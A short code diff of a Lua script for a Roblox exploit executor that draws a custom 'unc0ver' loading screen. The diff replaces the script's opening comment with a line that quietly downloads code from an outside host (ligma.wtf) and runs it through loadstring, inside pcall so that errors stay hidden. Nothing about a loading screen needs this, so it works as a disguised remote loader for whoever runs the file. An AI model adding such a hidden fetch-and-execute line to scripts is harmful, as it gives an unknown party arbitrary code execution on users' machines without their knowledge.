@@ -1,4 +1,4 @@
---// funni unc0ver loading screen by spec
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 local getasset = getsynasset or getcustomasset
 makefolder("loadingimages")
 writefile("loadingimages/unc0verlogo.png", game:HttpGet("https://raw.githubusercontent.com/scotdotwtf/lua-projects/main/customload/images/unc0verlogo.png"))
